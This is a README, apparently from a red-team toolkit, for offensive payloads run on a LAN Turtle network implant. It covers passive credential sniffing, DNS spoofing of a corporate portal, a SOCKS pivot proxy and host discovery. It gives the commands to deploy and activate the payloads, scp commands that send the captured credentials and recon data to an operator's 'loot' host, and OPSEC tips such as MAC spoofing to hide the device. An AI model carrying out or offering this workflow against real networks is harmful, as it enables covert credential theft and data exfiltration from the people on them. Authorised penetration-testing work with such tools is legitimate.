# LAN Turtle — Payload Arsenal

## Overview

Operational payload modules for the LAN Turtle covert network implant. Each payload is a self-contained POSIX shell script (`/bin/sh` — BusyBox ash) designed for the Turtle's constrained environment.

## Device Constraints

| Resource | Limit | Impact |
|----------|-------|--------|
| Overlay | 1.3 MB free | Scripts must be small; deploy to /tmp if transient |
| tmpfs | 29 MB | All output, captures, logs go here |
| RAM | 64 MB total | Lightweight processes only |
| Shell | BusyBox ash | POSIX sh only — no bash arrays, `[[`, etc. |
| Tools | nmap, tcpdump, ncat, netcat, python2.7, iptables | No responder, no bettercap |

## Payload Inventory

| Payload | File | Purpose | Noise Level | Tools Used |
|---------|------|---------|-------------|------------|
| Recon | `recon.sh` | Host discovery + service enumeration | Medium (active scan) | nmap, ip |
| Cred Harvest | `cred-harvest.sh` | Cleartext credential capture | Silent (passive sniff) | tcpdump |
| Pivot Proxy | `pivot-proxy.sh` | SOCKS proxy for operator pivoting | Silent (listener only) | ncat |
| DNS Redirect | `dns-redirect.sh` | DNS interception via iptables | Low (rule injection) | iptables, dnsmasq |
| ARP Watch | `arp-watch.sh` | Passive network host mapping | Silent (reads ARP cache) | ip, arp |

## Deployment

### Copy to Turtle

From WSL (Turtle connected via USB):
```sh
scp payloads/*.sh root@172.16.84.1:/root/
ssh turtle 'chmod +x /root/*.sh'
```

Over VPN (Turtle deployed in field):
```sh
scp -P 2222 payloads/*.sh root@172.16.42.1:/root/
```

### Activate Payloads

```sh
# From Turtle shell (via reverse tunnel or direct SSH)

# Passive recon (zero noise)
/root/arp-watch.sh start

# Network discovery (generates traffic — use during busy hours)
/root/recon.sh full

# Credential sniffing (passive — leave running)
/root/cred-harvest.sh start

# Pivot into target network (operator use)
/root/pivot-proxy.sh start

# DNS interception (active — affects connected host)
/root/dns-redirect.sh start 10.8.0.1
/root/dns-redirect.sh spoof portal.corp.com 10.8.0.1
```

### Exfiltrate Results

All output goes to `/tmp/`. Use the existing `exfil.sh` to SCP everything to Pineapple, or manually:
```sh
scp -r /tmp/recon/ root@10.8.0.1:/root/loot/turtle/$(date +%Y%m%d)/
scp -r /tmp/creds/ root@10.8.0.1:/root/loot/turtle/$(date +%Y%m%d)/
scp -r /tmp/arp-watch/ root@10.8.0.1:/root/loot/turtle/$(date +%Y%m%d)/
```

## OPSEC Notes

- **All output → /tmp only**. Nothing survives reboot unless exfiltrated.
- **C2 exclusions**: Every payload excludes VPN (10.8.0.0/24, UDP 1194) and management (172.16.84.0/24) traffic.
- **Noise discipline**: `arp-watch` and `cred-harvest` are silent. `recon` generates scannable traffic. `dns-redirect` modifies host behavior. Choose based on ROE.
- **Cleanup**: `stop` commands restore pre-payload state. On reboot, /tmp is wiped clean.
- **MAC spoofing**: eth1 MAC is already spoofed via rc.local (hides Hak5 OUI).

## Payload Selection Guide

| Mission Profile | Recommended Payloads | Risk |
|----------------|---------------------|------|
| Passive intelligence | arp-watch + cred-harvest | Minimal |
| Network mapping | arp-watch + recon (discover) | Low |
| Full enumeration | recon (full) + cred-harvest | Medium |
| Operator pivot | pivot-proxy + recon | Medium |
| Targeted interception | dns-redirect + cred-harvest | High |
| Maximum collection | All payloads active | High |
